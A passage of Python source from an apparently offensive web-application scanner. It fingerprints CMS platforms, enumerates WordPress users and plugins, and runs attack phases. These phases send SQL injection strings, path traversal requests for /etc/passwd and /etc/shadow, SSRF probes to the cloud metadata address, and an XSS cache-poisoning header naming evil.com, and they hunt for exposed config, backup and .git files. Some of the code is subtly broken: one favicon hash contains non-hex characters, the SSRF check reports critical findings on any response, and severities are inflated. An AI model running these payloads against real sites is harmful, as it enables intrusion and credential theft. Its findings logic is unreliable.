        inf("Running Offensive Security Assessments...")
        phases = [
            self.phase1_auth_attacks, self.phase2_input_validation,
            self.phase3_file_system, self.phase4_session_tokens,
            self.phase5_cms_chains, self.phase6_injection_code,
            self.phase7_database, self.phase8_caching,
            self.phase9_social_engineering, self.phase10_emerging_vectors
        ]
        for phase in phases:
            try: phase()
            except Exception as e:
                if CFG['verbose']: wrn(f"Offensive phase error: {str(e)[:100]}")
        return self.results
    
    def add_result(self, name, desc, severity, proof="", payload=""):
        result = {'name': name, 'description': desc, 'severity': severity.upper(),
                  'proof': proof, 'payload': payload, 'timestamp': datetime.now().isoformat()}
        self.results['successful'].append(result)
        color = {'critical': Colors.RED+Colors.BOLD, 'high': Colors.RED, 'medium': Colors.YELLOW, 'low': Colors.BLUE}.get(severity.lower(), Colors.WHITE)
        print(f"{color}[!] {severity.upper()} - {name}{Colors.RESET}")
        print(f"    {desc}")
        if proof: print(f"    Proof: {proof}")
        if payload: print(f"    Payload: {payload}")
        print()
    
    def phase1_auth_attacks(self):
        inf("Phase 1: Authentication Attacks...")
        reset_urls = ['/reset-password', '/forgot-password', '/wp-login.php?action=lostpassword']
        for reset in reset_urls:
            try:
                r, s = make_request(self.url + reset, ua=self.ua, timeout=20)
                if s and r.status_code == 200:
                    self.add_result("Password Reset Session Fixation", "Potential session fixation in password reset", "high", f"Reset endpoint: {reset}", "Session token")
                    break
            except: pass
    
    def phase2_input_validation(self):
        inf("Phase 2: Input Validation Attacks...")
        payloads = ["1'", "1' OR '1'='1", "1' UNION SELECT NULL-- -"]
        for payload in payloads:
            try:
                r, s = make_request(self.url + f"?id={quote(payload)}", ua=self.ua, timeout=20)
                if s and any(err in r.text.lower() for err in ['sql syntax', 'mysql error', 'database error']):
                    self.add_result("Second-Order SQL Injection", "Potential second-order SQL injection", "critical", f"Payload: {payload}", payload)
                    break
            except: pass
    
    def phase3_file_system(self):
        inf("Phase 3: File System Attacks...")
        payloads = ["../../../../etc/passwd", "../../../../etc/shadow"]
        for payload in payloads:
            try:
                r, s = make_request(self.url + f"?file={quote(payload)}", ua=self.ua, timeout=20)
                if s and ('root:x:0:0' in r.text):
                    self.add_result("LFI to RCE", "Local File Inclusion to Remote Code Execution", "critical", f"File: {payload}", payload)
                    break
            except: pass
    
    def phase4_session_tokens(self):
        inf("Phase 4: Session Token Attacks...")
        try:
            r1, s1 = make_request(self.url, ua=self.ua, timeout=20)
            r2, s2 = make_request(self.url, ua=self.ua, timeout=20)
            if s1 and s2:
                for cookie1 in r1.cookies:
                    for cookie2 in r2.cookies:
                        if cookie1.name == cookie2.name and cookie1.value == cookie2.value:
                            self.add_result("Session Token Predictability", "Session token not changing between requests", "high", f"Cookie: {cookie1.name}", cookie1.value)
                            break
        except: pass
    
    def phase5_cms_chains(self):
        inf("Phase 5: CMS Vulnerability Chains...")
        if self.cid == 'wp':
            try:
                r, s = make_request(self.url + 'wp-admin/admin-ajax.php', ua=self.ua, timeout=20)
                if s and r.status_code in [200, 400]:
                    self.add_result("WP Admin-Ajax Exploit", "WordPress admin-ajax.php endpoint accessible", "high", "admin-ajax.php detected", "action=malicious")
            except: pass
            try:
                r, s = make_request(self.url + 'wp-json/wp/v2/users', ua=self.ua, timeout=20)
                if s and r.status_code == 200:
                    self.add_result("WP REST API Priv Esc", "WordPress REST API user data accessible", "critical", "User data exposed", "/wp-json/wp/v2/users")
            except: pass
        if self.cid == 'joom':
            components = ['com_content', 'com_users', 'com_media']
            for comp in components:
                try:
                    r, s = make_request(self.url + f'administrator/index.php?option={comp}', ua=self.ua, timeout=20)
                    if s and r.status_code == 200:
                        self.add_result("Joomla Component Exploit", f"Component {comp} accessible", "high", f"Component: {comp}", comp)
                except: pass
        if self.cid == 'dru':
            try:
                r, s = make_request(self.url + 'jsonapi/', ua=self.ua, timeout=20)
                if s and r.status_code == 200:
                    self.add_result("Drupal Entity API Exploit", "JSON API accessible for entity exploitation", "critical", "jsonapi/ detected", "/jsonapi")
            except: pass
        if self.cid == 'laravel':
            try:
                r, s = make_request(self.url + 'api/users', ua=self.ua, timeout=20)
                if s and r.status_code == 200:
                    self.add_result("Laravel API Exposure", "API endpoint accessible", "high", "/api/users accessible", "/api/users")
            except: pass
    
    def phase6_injection_code(self):
        inf("Phase 6: Advanced Injection & Code Execution...")
        ssrf_payloads = ["http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/"]
        for payload in ssrf_payloads:
            try:
                r, s = make_request(self.url + f"?url={quote(payload)}", ua=self.ua, timeout=20)
                if s:
                    self.add_result("SSRF to RCE", f"Potential SSRF to internal network with {payload}", "critical", payload, payload)
                    break
            except: pass
    
    def phase7_database(self):
        inf("Phase 7: Database Attacks...")
        backups = ['backup.sql', 'db_backup.sql', 'database.sql', 'dump.sql']
        for backup in backups:
            try:
                r, s = make_request(self.url + backup, ua=self.ua, timeout=20)
                if s and r.status_code == 200 and 'CREATE TABLE' in r.text:
                    self.add_result("Database Backup Exposure", f"Database backup found: {backup}", "critical", f"Backup: {backup}", backup)
                    break
            except: pass
        configs = ['config.php', 'configuration.php', 'wp-config.php', 'settings.php', '.env']
        for config in configs:
            try:
                r, s = make_request(self.url + config, ua=self.ua, timeout=20)
                if s and r.status_code == 200:
                    if 'DB_PASSWORD' in r.text or 'DB_USER' in r.text or 'APP_KEY' in r.text:
                        self.add_result("Configuration Exposure", f"Config file {config} contains credentials", "critical", f"Config: {config}", config)
                        break
            except: pass
    
    def phase8_caching(self):
        inf("Phase 8: Caching Attacks...")
        poison_payload = "<script>alert('XSS')</script>"
        headers = {'X-Forwarded-Host': f'evil.com", "X-Forwarded-Host": "{poison_payload}"'}
        try:
            r, s = make_request(self.url, headers=headers, ua=self.ua, timeout=20)
            if s and poison_payload in r.text:
                self.add_result("Cache Poisoning to XSS", f"Cache poisoning with XSS payload", "critical", poison_payload, poison_payload)
        except: pass
    
    def phase9_social_engineering(self):
        inf("Phase 9: Social Engineering Attacks...")
        reset_urls = ['/reset-password', '/forgot-password', '/wp-login.php?action=lostpassword']
        for reset in reset_urls:
            try:
                r, s = make_request(self.url + reset, ua=self.ua, timeout=20)
                if s and r.status_code == 200:
                    self.add_result("Password Reset Account Takeover", "Password reset endpoint with potential logic flaw", "critical", f"Reset endpoint: {reset}", "Reset other user's password")
                    break
            except: pass
    
    def phase10_emerging_vectors(self):
        inf("Phase 10: Emerging Threat Vectors...")
        vcs_files = ['.git/config', '.git/HEAD', '.svn/entries']
        for vcs in vcs_files:
            try:
                r, s = make_request(self.url + vcs, ua=self.ua, timeout=20)
                if s and r.status_code == 200:
                    self.add_result("VCS/CI/CD Pipeline Exploitation", f"VCS file {vcs} exposed for CI/CD exploitation", "critical", f"VCS file: {vcs}", vcs)
                    break
            except: pass

class CMSDetector:
    def __init__(self, url, ua):
        self.url = url; self.ua = ua
        self.results = {'cms': None, 'version': None, 'confidence': 0, 'methods': [],
                       'plugins': [], 'themes': [], 'waf': None, 'cdn': None,
                       'server': None, 'favicon_hash': None, 'favicon_url': None}

    def detect_all(self):
        methods = [
            ('source', self.detect_from_source), ('headers', self.detect_from_headers),
            ('cookies', self.detect_from_cookies), ('js', self.detect_from_js),
            ('css', self.detect_from_css), ('favicon', self.detect_from_favicon),
            ('robots', self.detect_from_robots), ('sitemap', self.detect_from_sitemap),
            ('xmlrpc', self.detect_from_xmlrpc), ('server', self.detect_from_server_info)
        ]
        confidence_scores = {}
        method_count = 0
        for method_name, method_func in methods:
            try:
                result = method_func()
                if result:
                    cms, version = result if isinstance(result, tuple) else (result, None)
                    if cms:
                        confidence_scores[cms] = confidence_scores.get(cms, 0) + 1
                        self.results['methods'].append(method_name)
                        if version: self.results['version'] = version
                        method_count += 1
            except: continue
        if confidence_scores:
            self.results['cms'] = max(confidence_scores, key=confidence_scores.get)
            self.results['confidence'] = confidence_scores[self.results['cms']] / max(len(methods), 1)
        self.results['waf'] = detect_waf(self.url, self.ua)
        self.results['cdn'] = detect_cdn(self.url, self.ua)
        self.results['plugins'] = enumerate_plugins(self.url, self.ua)
        self.results['themes'] = enumerate_themes(self.url, self.ua)
        try:
            r, s = make_request(self.url + 'favicon.ico', ua=self.ua, timeout=20)
            if s and r and r.status_code == 200:
                self.results['favicon_hash'] = hashlib.md5(r.content).hexdigest()
                self.results['favicon_url'] = self.url + 'favicon.ico'
        except: pass
        return self.results

    def detect_from_source(self):
        r, s = make_request(self.url, ua=self.ua, timeout=25)
        if not s: return None
        source = r.text
        patterns = [
            (r'wp-content', 'wp'), (r'wp-includes', 'wp'), (r'WordPress', 'wp'),
            (r'Joomla!', 'joom'), (r'com_content', 'joom'), (r'Drupal', 'dru'),
            (r'drupal.js', 'dru'), (r'Craft CMS', 'craft'), (r'craft/plugins', 'craft'),
            (r'MetInfo', 'metinfo'), (r'metinfo.inc.php', 'metinfo'), (r'Bolt CMS', 'bolt'),
            (r'bolt/assets', 'bolt'), (r'MODX', 'modx'), (r'manager/index.php', 'modx'),
            (r'Bitrix', 'bitrix'), (r'/bitrix/', 'bitrix'), (r'Textpattern', 'tpc'),
            (r'textpattern/index.php', 'tpc'), (r'UMI.CMS', 'umi'), (r'umi', 'umi'),
            (r'Tiki Wiki', 'tiki'), (r'tiki-index.php', 'tiki'), (r'Wolf CMS', 'wolf'),
            (r'wolfcms', 'wolf'), (r'WIX', 'wix'), (r'wix.com', 'wix'),
            (r'WebsiteBaker', 'wb'), (r'WB CMS', 'wb'), (r'WebGUI', 'wgui'),
            (r'webgui', 'wgui'), (r'TiddlyWiki', 'tidw'), (r'tiddlywiki', 'tidw'),
            (r'SULU', 'sulu'), (r'sulu', 'sulu'), (r'Subrion', 'subcms'),
            (r'Subrion CMS', 'subcms'), (r'Squiz Matrix', 'sqm'), (r'squiz', 'sqm'),
            (r'Spin CMS', 'spin'), (r'spincms', 'spin'), (r'Solodev', 'sdev'),
            (r'solodev', 'sdev'), (r'sNews', 'snews'), (r'snews', 'snews'),
            (r'Sitecore', 'score'), (r'sitecore', 'score'), (r'SIMsite', 'sim'),
            (r'simgroep', 'sim'), (r'Simplebo', 'spb'), (r'simplebo', 'spb'),
            (r'SilverStripe', 'sst'), (r'silverstripe', 'sst'), (r'Silva CMS', 'silva'),
            (r'silva', 'silva'), (r'DataLife Engine', 'dle'), (r'dle_news', 'dle'),
            (r'Serendipity', 'spity'), (r's9y', 'spity'), (r'RoundCube', 'rcube'),
            (r'roundcube', 'rcube'), (r'SeamlessCMS', 'slcms'), (r'seamless', 'slcms'),
            (r'Rock RMS', 'rock'), (r'rockrms', 'rock'), (r'Roadiz', 'roadz'),
            (r'roadiz', 'roadz'), (r'RiteCMS', 'rite'), (r'ritecms', 'rite'),
            (r'RCMS', 'rcms'), (r'reallycms', 'rcms'), (r'Quick.Cms', 'quick'),
            (r'quickcms', 'quick'), (r'Pimcore', 'pcore'), (r'pimcore', 'pcore'),
            (r'Laravel', 'laravel'), (r'laravel', 'laravel'), (r'csrf-token', 'laravel'),
            (r'Adobe Experience Manager', 'aem'), (r'crx', 'aem'), (r'Kentico', 'kentico'),
            (r'Liferay', 'liferay'), (r'Alfresco', 'alfresco'), (r'Magnolia', 'magnolia'),
            (r'TYPO3', 'typo3')
        ]
        for pattern, cms in patterns:
            if re.search(pattern, source, re.I): return cms
        return None

    def detect_from_headers(self):
        r, s = make_request(self.url, ua=self.ua, timeout=20)
        if not s: return None
        headers = r.headers
        header_patterns = [
            ('x-powered-by', {'wp': 'wordpress', 'joom': 'joomla', 'dru': 'drupal', 'laravel': 'laravel', 'aem': 'aem'}),
            ('server', {'wp': 'wordpress', 'joom': 'joomla', 'dru': 'drupal', 'laravel': 'laravel'}),
            ('x-generator', {'wp': 'wordpress', 'joom': 'joomla', 'dru': 'drupal', 'laravel': 'laravel'}),
            ('x-drupal-cache', {'dru': 'drupal'}),
            ('x-drupal-dynamic-cache', {'dru': 'drupal'})
        ]
        for header, cms_map in header_patterns:
            if header in headers:
                value = headers[header].lower()
                for cms, pattern in cms_map.items():
                    if pattern in value: return cms
        return None

    def detect_from_cookies(self):
        r, s = make_request(self.url, ua=self.ua, timeout=20)
        if not s: return None
        cookies = r.cookies
        patterns = {
            'wp': ['wordpress', 'wp-settings', 'wp_lang'], 'joom': ['joomla', 'jml'],
            'dru': ['drupal', 'SESS'], 'craft': ['craft_session'],
            'metinfo': ['metinfo'], 'bolt': ['bolt_session'],
            'laravel': ['laravel_session'], 'aem': ['crx', 'cq']
        }
        for cookie_name in cookies:
            for cms, patterns_list in patterns.items():
                for pattern in patterns_list:
                    if pattern in cookie_name.lower(): return cms
        return None

    def detect_from_js(self):
        js_patterns = {
            'wp': ['wp-emoji-release.min.js', 'wp-embed.min.js', 'wp-json'],
            'joom': ['media/jui/js/jquery.min.js', 'media/system/js/core.js'],
            'dru': ['misc/drupal.js', 'core/assets/vendor/jquery/jquery.min.js'],
            'craft': ['cpresources/js/Craft.js', 'cpresources/js/Login.js'],
            'metinfo': ['js/metinfo.js', 'js/metinfo_admin.js'],
            'laravel': ['js/app.js', 'js/vendor.js'],
            'aem': ['/etc.clientlibs/']
        }
        for cms, patterns in js_patterns.items():
            for pattern in patterns:
                r, s = make_request(self.url + pattern, ua=self.ua, timeout=15)
                if s and r and r.status_code == 200: return cms
        return None

    def detect_from_css(self):
        css_patterns = {
            'wp': ['wp-content/themes/twentytwenty/style.css', 'wp-includes/css/dist/'],
            'joom': ['templates/system/css/system.css', 'media/jui/css/bootstrap.css'],
            'dru': ['core/themes/stable/css/system/components/', 'modules/system/system.css'],
            'craft': ['cpresources/css/craft.css', 'cpresources/css/login.css'],
            'metinfo': ['css/metinfo.css', 'css/metinfo_admin.css'],
            'laravel': ['css/app.css', 'css/vendor.css']
        }
        for cms, patterns in css_patterns.items():
            for pattern in patterns:
                r, s = make_request(self.url + pattern, ua=self.ua, timeout=15)
                if s and r and r.status_code == 200: return cms
        return None

    def detect_from_favicon(self):
        r, s = make_request(self.url + 'favicon.ico', ua=self.ua, timeout=20)
        if not s or r.status_code != 200: return None
        hash_val = hashlib.md5(r.content).hexdigest()
        favicon_map = {
            'f420dc2c7d90d7873a90d82cd7fde315': 'wp',
            '7b7f5f92be7f9d6d3e9d8b6e0b3a9c1d': 'joom',
            'a9f1c5d8e3f2c1b4a5d6e7f8g9h0i1j2': 'dru',
            '68eb59e670d9af6098fbf54f238df993': 'wp',
            'c4d09d5f5b8e5f5f5f5f5f5f5f5f5f5f': 'laravel'
        }
        return favicon_map.get(hash_val)

    def detect_from_robots(self):
        r, s = make_request(self.url + 'robots.txt', ua=self.ua, timeout=15)
        if not s or r.status_code != 200: return None
        content = r.text
        patterns = {
            'wp': ['Disallow: /wp-admin/', 'Allow: /wp-admin/admin-ajax.php'],
            'joom': ['Disallow: /administrator/', 'Disallow: /components/'],
            'dru': ['Disallow: /user/', 'Disallow: /node/'],
            'craft': ['Disallow: /admin/', 'Disallow: /cp/'],
            'metinfo': ['Disallow: /admin/', 'Disallow: /app/'],
            'laravel': ['Disallow: /admin/', 'Disallow: /api/']
        }
        for cms, patterns_list in patterns.items():
            if all(p in content for p in patterns_list): return cms
        return None

    def detect_from_sitemap(self):
        r, s = make_request(self.url + 'sitemap.xml', ua=self.ua, timeout=15)
        if not s or r.status_code != 200: return None
        content = r.text.lower()
        patterns = {
            'wp': ['wp-sitemap', 'wordpress'], 'joom': ['joomla', 'com_content'],
            'dru': ['drupal', 'node'], 'craft': ['craft', 'entries'],
            'laravel': ['laravel']
        }
        for cms, patterns_list in patterns.items():
            if any(p in content for p in patterns_list): return cms
        return None

    def detect_from_xmlrpc(self):
        r, s = make_request(self.url + 'xmlrpc.php', ua=self.ua, timeout=15)
        if not s: return None
        if r.status_code == 405: return 'wp'
        return None

    def detect_from_server_info(self):
        r, s = make_request(self.url, ua=self.ua, timeout=20)
        if not s: return None
        server = r.headers.get('Server', '')
        x_powered = r.headers.get('X-Powered-By', '')
        combined = (server + ' ' + x_powered).lower()
        patterns = {
            'wp': ['wordpress', 'wp'], 'joom': ['joomla', 'j!'],
            'dru': ['drupal'], 'craft': ['craft'],
            'metinfo': ['metinfo'], 'laravel': ['laravel'],
            'aem': ['aem']
        }
        for cms, patterns_list in patterns.items():
            if any(p in combined for p in patterns_list): return cms
        return None

def detect_cms(url, ua):
    init = getsource(url, ua)
    if init[0] != '1':
        err("Could not get target source")
        return {'cms':'unknown','confidence':0,'detection':'none'}
    src = init[1]; hdrs = init[2]
    methods = [
        ('headers', detect_cms_from_headers, hdrs),
        ('generator', lambda: detect_cms_from_generator(parse_generator(src)[1]), src),
        ('source', detect_cms_from_source, src, url),
        ('robots', detect_cms_from_robots, url, ua),
        ('dirs', detect_cms_from_dirs, url, ua),
        ('js', detect_cms_from_js, url, ua),
        ('css', detect_cms_from_css, url, ua),
        ('cookies', detect_cms_from_cookies, url, ua),
        ('favicon', detect_cms_from_favicon, url, ua),
        ('sitemap', detect_cms_from_sitemap, url, ua),
        ('xmlrpc', detect_cms_from_xmlrpc, url, ua),
        ('server', detect_cms_from_server_info, url, ua)
    ]
    for m in methods:
        try:
            if m[0] == 'headers': r = detect_cms_from_headers(hdrs)
            elif m[0] == 'generator':
                ga_c = parse_generator(src)[1]
                r = detect_cms_from_generator(ga_c)
            elif m[0] == 'source': r = detect_cms_from_source(src, url)
            elif m[0] == 'robots': r = detect_cms_from_robots(url, ua)
            elif m[0] == 'dirs': r = detect_cms_from_dirs(url, ua)
            elif m[0] == 'js': r = detect_cms_from_js(url, ua)
            elif m[0] == 'css': r = detect_cms_from_css(url, ua)
            elif m[0] == 'cookies': r = detect_cms_from_cookies(url, ua)
            elif m[0] == 'favicon': r = detect_cms_from_favicon(url, ua)
            elif m[0] == 'sitemap': r = detect_cms_from_sitemap(url, ua)
            elif m[0] == 'xmlrpc': r = detect_cms_from_xmlrpc(url, ua)
            elif m[0] == 'server': r = detect_cms_from_server_info(url, ua)
            else: continue
            if r:
                if isinstance(r, tuple): cid = r[0]
                else: cid = r
                cms = CMS_DB.get(cid, {})
                return {'cms':cid,'name':cms.get('name',cid),'confidence':0.9,'detection':m[0],'vd':cms.get('vd','0'),'deeps':cms.get('deeps','0')}
        except: continue
    return {'cms':'unknown','confidence':0,'detection':'none'}

def detect_version_wp(url, ua, src, hdrs):
    r_url = url + 'readme.html'
    r_src = getsource(r_url, ua)
    if r_src[0] == '1':
        m = re.search(r'WordPress\s+([0-9.]+)', r_src[1])
        if m: return m.group(1)
    v_url = url + 'wp-includes/version.php'
    v_src = getsource(v_url, ua)
    if v_src[0] == '1':
        m = re.search(r'\$wp_version\s*=\s*[\'"]([0-9.]+)[\'"]', v_src[1])
        if m: return m.group(1)
    m = re.search(r'<meta name="generator" content="WordPress\s+([0-9.]+)"', src)
    if m: return m.group(1)
    return "unknown"

def detect_version_joomla(url, ua, src, hdrs):
    for m_url in [url+'administrator/manifest.xml', url+'manifest.xml']:
        m_src = getsource(m_url, ua)
        if m_src[0] == '1' and '<version>' in m_src[1]:
            m = re.search(r'<version>([0-9.]+)</version>', m_src[1])
            if m: return m.group(1)
    return "unknown"

def detect_version_drupal(url, ua, src, hdrs):
    j_url = url + 'misc/drupal.js'
    j_src = getsource(j_url, ua)
    if j_src[0] == '1':
        if 'x-drupal-dynamic-cache' in str(j_src[2]):
            m = re.search(r'v=([0-9.]+)', j_src[2])
            if m: return m.group(1)
    m = re.search(r'<meta name="Generator" content="Drupal\s+([0-9.]+)"', src)
    if m: return m.group(1)
    return "unknown"

def detect_version_craft(url, ua, src, hdrs):
    m = re.search(r'Craft\s+([0-9.]+)', src)
    if m: return m.group(1)
    return "unknown"

def detect_version_metinfo(url, ua, src, hdrs):
    m = re.search(r'MetInfo\s+([0-9.]+)', src)
    if m: return m.group(1)
    return "unknown"

def detect_version_bolt(url, ua, src, hdrs):
    m = re.search(r'Bolt\s+([0-9.]+)', src)
    if m: return m.group(1)
    return "unknown"

def detect_version_umbraco(url, ua, src, hdrs):
    if 'x-powered-by' in str(hdrs).lower():
        m = re.search(r'umbraco\s+([0-9.]+)', str(hdrs).lower())
        if m: return m.group(1)
    return "unknown"

def detect_version_laravel(url, ua, src, hdrs):
    m = re.search(r'Laravel\s+([0-9.]+)', src)
    if m: return m.group(1)
    r, s = make_request(url + 'vendor/laravel/framework/src/Illuminate/Foundation/Application.php', ua=ua, timeout=20)
    if s and r and r.status_code == 200:
        m = re.search(r'const VERSION = \'([0-9.]+)\'', r.text)
        if m: return m.group(1)
    return "unknown"

def detect_version_aem(url, ua, src, hdrs):
    r, s = make_request(url + '/crx/de/index.jsp', ua=ua, timeout=20)
    if s and r and r.status_code == 200:
        m = re.search(r'Adobe Experience Manager\s+([0-9.]+)', r.text)
        if m: return m.group(1)
    return "unknown"

def detect_version_typo3(url, ua, src, hdrs):
    r, s = make_request(url + '/typo3/version.txt', ua=ua, timeout=20)
    if s and r and r.status_code == 200:
        m = re.search(r'TYPO3\s+([0-9.]+)', r.text)
        if m: return m.group(1)
    return "unknown"

def detect_version(cid, url, ua, src, hdrs):
    vd = {
        'wp':detect_version_wp,'joom':detect_version_joomla,
        'dru':detect_version_drupal,'craft':detect_version_craft,
        'metinfo':detect_version_metinfo,'bolt':detect_version_bolt,
        'umbraco':detect_version_umbraco,'laravel':detect_version_laravel,
        'aem':detect_version_aem,'typo3':detect_version_typo3
    }
    if cid in vd:
        try: return vd[cid](url, ua, src, hdrs)
        except: return "unknown"
    return "unknown"

class WPDeepScan:
    @staticmethod
    def user_enum(url, ua):
        users = []; raw_data = {}
        print(f"{Colors.CYAN}  ├─ User Enumeration Methods:{Colors.RESET}")
        print(f"{Colors.CYAN}  │  ├─ REST API...{Colors.RESET}")
        raw_data['rest_api'] = []
        try:
            api_url = url + 'wp-json/wp/v2/users'
            r, s = make_request(api_url, ua=ua, timeout=20)
            raw_data['rest_api'].append({'url': api_url, 'status': r.status_code if s and r else 'failed'})
            if s and r and r.status_code == 200:
                try:
                    data = r.json()
                    if data and isinstance(data, list):
                        raw_data['rest_api'][-1]['data'] = data
                        for u in data:
                            if isinstance(u, dict):
                                username = u.get('slug') or u.get('name') or u.get('username')
                                if username and username not in users and len(username) > 1:
                                    users.append(username)
                                    raw_data['rest_api'].append({'user': username, 'id': u.get('id'), 'data': u})
                                    print(f"{Colors.GREEN}  │  │  └─ Found: {username} (ID: {u.get('id', 'N/A')} via REST API){Colors.RESET}")
                except Exception as e:
                    raw_data['rest_api'][-1]['error'] = str(e)
                    print(f"{Colors.YELLOW}  │  │  └─ REST API: JSON parse error{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}  │  │  └─ REST API: Not accessible or no users{Colors.RESET}")
        except Exception as e:
            raw_data['rest_api'] = {'error': str(e)}
            print(f"{Colors.YELLOW}  │  │  └─ REST API: Error occurred{Colors.RESET}")
        
        print(f"{Colors.CYAN}  │  ├─ Author Parameter...{Colors.RESET}")
        raw_data['author_param'] = []
        try:
            found_authors = []
            for i in range(1, 21):
                author_url = url + '?author=' + str(i)
                r, s = make_request(author_url, ua=ua, timeout=15)
                if s and r and r.status_code == 200:
                    if r.history:
                        final_url = r.url
                        match = re.search(r'/author/([^/]+)/?', final_url)
                        if match:
                            author = match.group(1)
                            if author and author not in users and len(author) > 1:
                                users.append(author); found_authors.append(author)
                                raw_data['author_param'].append({'id': i, 'method': 'redirect', 'user': author})
                                print(f"{Colors.GREEN}  │  │  └─ Found: {author} (author param: {i}){Colors.RESET}")
                                continue
                    m = re.search(r'<link rel="canonical" href="[^"]*/author/([^/"]+)/?"', r.text)
                    if m and m.group(1) not in users and len(m.group(1)) > 1:
                        users.append(m.group(1)); found_authors.append(m.group(1))
                        raw_data['author_param'].append({'id': i, 'method': 'canonical', 'user': m.group(1)})
                        print(f"{Colors.GREEN}  │  │  └─ Found: {m.group(1)} (author param: {i}){Colors.RESET}")
                        continue
                    m2 = re.findall(r'<a href="[^"]*/author/([^/"]+)/?"', r.text)
                    for author in m2:
                        if author not in users and len(author) > 1:
                            users.append(author); found_authors.append(author)
                            raw_data['author_param'].append({'id': i, 'method': 'post_link', 'user': author})
                            print(f"{Colors.GREEN}  │  │  └─ Found: {author} (author param: {i}){Colors.RESET}")
                    if len(found_authors) >= 10:
                        break
        except Exception as e:
            raw_data['author_param'] = {'error': str(e)}
            print(f"{Colors.YELLOW}  │  │  └─ Author Parameter: Error occurred{Colors.RESET}")
        
        print(f"{Colors.CYAN}  │  ├─ Feed...{Colors.RESET}")
        raw_data['feed'] = []
        try:
            feed_urls = ['feed/', 'feed/rss2/', 'feed/atom/']
            for feed in feed_urls:
                feed_url = url + feed
                r, s = make_request(feed_url, ua=ua, timeout=15)
                if s and r and r.status_code == 200:
                    raw_data['feed'].append({'url': feed_url, 'status': r.status_code})
                    m = re.findall(r'<dc:creator>(.*?)</dc:creator>', r.text)
                    for user in m:
                        if user not in users and user != "" and len(user) > 1:
                            users.append(user)
                            raw_data['feed'].append({'url': feed_url, 'user': user, 'source': 'dc:creator'})
                            print(f"{Colors.GREEN}  │  │  └─ Found: {user} (from feed){Colors.RESET}")
        except Exception as e:
            raw_data['feed'] = {'error': str(e)}
            print(f"{Colors.YELLOW}  │  │  └─ Feed: Error occurred{Colors.RESET}")
        
        print(f"{Colors.CYAN}  │  ├─ Sitemap...{Colors.RESET}")
        raw_data['sitemap'] = []
        try:
            sitemaps = ['sitemap.xml', 'sitemap_index.xml', 'wp-sitemap.xml']
            for smap in sitemaps:
                sitemap_url = url + smap
                r, s = make_request(sitemap_url, ua=ua, timeout=15)
                if s and r and r.status_code == 200:
                    raw_data['sitemap'].append({'url': sitemap_url, 'status': r.status_code})
                    m = re.findall(r'<loc>([^<]+)</loc>', r.text)
                    for loc in m:
                        if '/author/' in loc:
                            author = re.search(r'/author/([^/"]+)[/"]?', loc)
                            if author and author.group(1) not in users and len(author.group(1)) > 1:
                                users.append(author.group(1))
                                raw_data['sitemap'].append({'url': sitemap_url, 'user': author.group(1), 'source': 'author_url'})
                                print(f"{Colors.GREEN}  │  │  └─ Found: {author.group(1)} (from sitemap){Colors.RESET}")
        except Exception as e:
            raw_data['sitemap'] = {'error': str(e)}
            print(f"{Colors.YELLOW}  │  │  └─ Sitemap: Error occurred{Colors.RESET}")
        
        raw_data['total_users'] = len(users)
        print(f"{Colors.CYAN}  │  └─ Total Users Found: {Colors.GREEN}{len(users)}{Colors.RESET}")
        return list(set(users)), raw_data

    @staticmethod
    def plugin_enum(source, url, ua):
        plugins = []; raw_data = {}
        print(f"{Colors.CYAN}  ├─ Plugin Enumeration Methods:{Colors.RESET}")
        print(f"{Colors.CYAN}  │  ├─ Source Code Analysis...{Colors.RESET}")
        raw_data['source_code'] = []
        try:
            patterns = [
                (r'wp-content/plugins/([^/]+)/', 'standard'),
                (r'src=".*?wp-content/plugins/([^/]+)/', 'src_attr'),
                (r'href=".*?wp-content/plugins/([^/]+)/', 'href_attr'),
                (r'plugins/([^/]+)/', 'simple')
            ]
            found_plugins = []
            for pattern, source_type in patterns:
                m = re.findall(pattern, source)
                for p in m:
                    if p not in ['', '../', '..', ' ', '?'] and p not in found_plugins:
                        ver_match = re.search(r'wp-content/plugins/' + re.escape(p) + r'/.+ver=([0-9.]+)', source)
                        version = ver_match.group(1) if ver_match else 'unknown'
                        plugin_entry = f"{p}:{version}"
                        if plugin_entry not in plugins:
                            plugins.append(plugin_entry); found_plugins.append(p)
                            raw_data['source_code'].append({'plugin': p, 'version': version, 'source': source_type})
                            print(f"{Colors.GREEN}  │  │  └─ Found: {p} v{version} (from source code){Colors.RESET}")
        except Exception as e:
            raw_data['source_code'] = {'error': str(e)}
            print(f"{Colors.YELLOW}  │  │  └─ Source Code: Error occurred{Colors.RESET}")
        
        print(f"{Colors.CYAN}  │  ├─ Directory Listing...{Colors.RESET}")
        raw_data['directory_listing'] = []
        try:
            r, s = make_request(url + 'wp-content/plugins/', ua=ua, timeout=15)
            if s and r and r.status_code == 200:
                raw_data['directory_listing'].append({'url': url + 'wp-content/plugins/', 'status': r.status_code})
                if 'Index of' in r.text:
                    m = re.findall(r'href="([^"]+)/"', r.text)
                    for p in m:
                        if p not in ['', '../', '..', '?'] and not p.startswith('?'):
                            plugin_entry = f"{p}:unknown"
                            if plugin_entry not in plugins:
                                plugins.append(plugin_entry)
                                raw_data['directory_listing'].append({'plugin': p, 'source': 'directory_listing'})
                                print(f"{Colors.GREEN}  │  │  └─ Found: {p} (directory listing){Colors.RESET}")
        except Exception as e:
            raw_data['directory_listing'] = {'error': str(e)}
            print(f"{Colors.YELLOW}  │  │  └─ Directory Listing: Error occurred{Colors.RESET}")
        
        print(f"{Colors.CYAN}  │  ├─ Readme Files...{Colors.RESET}")
        raw_data['readme_files'] = []
        try:
            plugin_names = [p.split(':')[0] for p in plugins[:50]]
            for name in plugin_names:
                readme_url = url + f'wp-content/plugins/{name}/readme.txt'
                r, s = make_request(readme_url, ua=ua, timeout=15)
                if s and r and r.status_code == 200:
                    raw_data['readme_files'].append({'plugin': name, 'url': readme_url, 'status': r.status_code})
                    ver_match = re.search(r'Stable tag:\s*([0-9.]+)', r.text)
                    if ver_match:
                        new_plugin = f"{name}:{ver_match.group(1)}"
                        if new_plugin not in plugins:
                            for i, pl in enumerate(plugins):
                                if pl.split(':')[0] == name:
                                    plugins[i] = new_plugin
                                    break
                            else:
                                plugins.append(new_plugin)
                            raw_data['readme_files'].append({'plugin': name, 'version': ver_match.group(1), 'source': 'readme'})
                            print(f"{Colors.GREEN}  │  │  └─ {name} version: {ver_match.group(1)} (from readme){Colors.RESET}")
        except Exception as e:
            raw_data['readme_files'] = {'error': str(e)}
            print(f"{Colors.YELLOW}  │  │  └─ Readme Files: Error occurred{Colors.RESET}")
        
        raw_data['total_plugins'] = len(plugins)
